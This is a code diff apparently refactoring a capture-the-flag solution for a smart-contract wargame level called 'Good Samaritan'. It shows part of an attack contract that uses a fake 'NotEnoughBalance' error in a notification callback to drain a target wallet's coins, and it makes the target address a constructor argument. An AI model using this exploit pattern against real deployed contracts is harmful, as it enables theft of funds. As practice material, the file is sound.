@@ -1,5 +1,5 @@
 // SPDX-License-Identifier: MIT
-pragma solidity 0.8.24;
+pragma solidity ^0.8.20;
 
 /**
  * @title 27. GOOD SAMARITAN
@@ -25,10 +25,16 @@ interface ICoin {
 contract ThanksForTheNotif {
     IGoodOldSama private goodOldSama =
         IGoodOldSama(0x19bd36accED359007B00Baf460Eb07045c3396BD);
-    ICoin private coin = ICoin(goodOldSama.coin());
-    address private wallet = goodOldSama.wallet();
+    ICoin private coin;
+    address private wallet;
 
     error NotEnoughBalance();
+
+    constructor(address _goodOldSama) {
+        goodOldSama = IGoodOldSama(_goodOldSama);
+        coin = ICoin(goodOldSama.coin());
+        wallet = goodOldSama.wallet();
+    }
 
     function notify(uint256 amount) public pure {
         if (amount == 10) {
@@ -41,5 +47,3 @@ contract ThanksForTheNotif {
         require(coin.balances(wallet) == 0, "Attack failed!");
     }
 }
-
-// 🎉 Level completed! 🎉
